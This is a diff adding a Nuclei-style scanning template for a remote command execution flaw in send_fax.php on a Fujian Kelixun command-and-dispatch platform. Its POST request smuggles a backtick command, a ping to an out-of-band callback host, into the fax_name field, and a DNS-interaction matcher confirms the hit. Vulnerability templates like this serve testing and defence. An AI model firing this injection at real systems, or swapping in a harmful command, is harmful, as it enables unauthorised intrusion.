@@ -1,0 +1,25 @@
+id: command-dispatch-send-fax-rce
+
+info:
+  name: 福建科立讯通信指挥调度平台 send_fax.php 远程命令执行漏洞
+  author: msk
+  severity: high
+  tags: 指挥调度管理平台
+
+
+
+http:
+  - raw:
+      - |
+        POST /api/client/fax/send_fax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fax_name=`ping {{interactsh-url}}`.pdf
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
